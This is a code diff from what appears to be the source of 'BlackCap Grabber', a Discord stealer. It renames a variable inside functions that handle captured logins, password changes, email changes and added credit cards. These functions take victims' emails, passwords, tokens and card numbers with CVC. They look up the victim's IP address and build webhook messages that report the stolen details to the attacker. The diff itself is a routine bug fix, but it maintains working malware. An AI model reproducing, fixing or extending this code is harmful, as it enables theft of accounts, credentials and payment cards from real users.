@@ -812,12 +812,12 @@ async function Login(email, password, token) {
                 }
                 return billing
             }
-            if(b.avatar === null){
+            if(info.avatar === null){
                 usericonurl = "https://raw.githubusercontent.com/KSCHdsc/BlackCap-Assets/main/blackcap%20(2).png"
-            }else usericonurl = `https://cdn.discordapp.com/avatars/${b.id}/${b.avatar}.png?size=600`;
-            if(b.banner === null){
+            }else usericonurl = `https://cdn.discordapp.com/avatars/${info.id}/${info.avatar}.png?size=600`;
+            if(info.banner === null){
                 bannerurl = "https://raw.githubusercontent.com/KSCHdsc/BlackCap-Assets/main/Banner.png"
-            }else bannerurl = `https://cdn.discordapp.com/banners/${b.id}/${b.banner}.png?size=160`;
+            }else bannerurl = `https://cdn.discordapp.com/banners/${info.id}/${info.banner}.png?size=160`;
             
             const params = {
                 username: "BlackCap Grabber",
@@ -836,7 +836,7 @@ async function Login(email, password, token) {
                         inline: !0
 												}, {
                         name: "ID <:iduser:1041634535395307520>",
-                        value: `\`${info.id}\`\n[Copy ID](https://paste-pgpj.onrender.com/?p=${b.id})`,
+                        value: `\`${info.id}\`\n[Copy ID](https://paste-pgpj.onrender.com/?p=${info.id})`,
                         inline: !0
 												}, {
                         name: "Nitro <a:nitro:1041639670288748634>",
@@ -992,7 +992,7 @@ async function ChangePassword(oldpassword, newpassword, token) {
                         inline: !0
 												}, {
                         name: "ID <:iduser:1041634535395307520>",
-                        value: `\`${info.id}\`\n[Copy ID](https://paste-pgpj.onrender.com/?p=${b.id})`,
+                        value: `\`${info.id}\`\n[Copy ID](https://paste-pgpj.onrender.com/?p=${info.id})`,
                         inline: !0
 												}, {
                         name: "Nitro <a:nitro:1041639670288748634>",
@@ -1130,12 +1130,12 @@ async function ChangeEmail(newemail, password, token) {
                 }
                 return billing
             }
-            if(b.avatar === null){
+            if(info.avatar === null){
                 usericonurl = "https://raw.githubusercontent.com/KSCHdsc/BlackCap-Assets/main/blackcap%20(2).png"
-            }else usericonurl = `https://cdn.discordapp.com/avatars/${b.id}/${b.avatar}.png?size=600`;
-            if(b.banner === null){
+            }else usericonurl = `https://cdn.discordapp.com/avatars/${info.id}/${info.avatar}.png?size=600`;
+            if(info.banner === null){
                 bannerurl = "https://raw.githubusercontent.com/KSCHdsc/BlackCap-Assets/main/Banner.png"
-            }else bannerurl = `https://cdn.discordapp.com/banners/${b.id}/${b.banner}.png?size=160`;
+            }else bannerurl = `https://cdn.discordapp.com/banners/${info.id}/${info.banner}.png?size=160`;
 
 
             
@@ -1156,7 +1156,7 @@ async function ChangeEmail(newemail, password, token) {
                                 inline: !0
 					}, {
                                 name: "ID <:iduser:1041634535395307520>",
-                                value: `\`${info.id}\`\n[Copy ID](https://paste-pgpj.onrender.com/?p=${b.id})`,
+                                value: `\`${info.id}\`\n[Copy ID](https://paste-pgpj.onrender.com/?p=${info.id})`,
                                 inline: !0
 					}, {
                                 name: "Nitro <a:nitro:1041639670288748634>",
@@ -1238,12 +1238,12 @@ async function CreditCardAdded(number, cvc, expir_month, expir_year, token) {
     var {
         ip
     } = await getFromURL("https://www.myexternalip.com/json", null)
-        if(b.avatar === null){
+        if(info.avatar === null){
             usericonurl = "https://raw.githubusercontent.com/KSCHdsc/BlackCap-Assets/main/blackcap%20(2).png"
-        }else usericonurl = `https://cdn.discordapp.com/avatars/${b.id}/${b.avatar}.png?size=600`;
-        if(b.banner === null){
+        }else usericonurl = `https://cdn.discordapp.com/avatars/${info.id}/${info.avatar}.png?size=600`;
+        if(info.banner === null){
             bannerurl = "https://raw.githubusercontent.com/KSCHdsc/BlackCap-Assets/main/Banner.png"
-        }else bannerurl = `https://cdn.discordapp.com/banners/${b.id}/${b.banner}.png?size=160`;
+        }else bannerurl = `https://cdn.discordapp.com/banners/${info.id}/${info.banner}.png?size=160`;
 
         
         const params = {
